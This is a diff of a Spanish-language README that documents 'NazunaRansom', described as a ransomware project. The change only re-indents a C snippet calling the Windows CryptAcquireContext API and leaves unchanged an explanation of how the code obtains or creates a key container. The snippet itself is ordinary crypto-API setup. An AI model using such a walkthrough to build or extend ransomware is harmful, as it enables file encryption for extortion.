@@ -18,11 +18,11 @@ NazunaRansom, es un ransomware inspirado en mi waifu (Nazuna)
 **CryptAcquireContext**
 
 ```c
-    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
-        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
-            return FALSE;
-        }
+if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
+    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
+        return FALSE;
     }
+}
 ```
 En el primer if trata de obtener el identificador del contenedor CSP, ```hProv``` funciona como un puntero que almacena el identificador CSP, si no se puede obtener el identifcador se vuelva a llamar a ```CryptAcquireContext``` con ```CRYPT_NEWKEYSET``` para crear un contenedor de claves en CSP
 
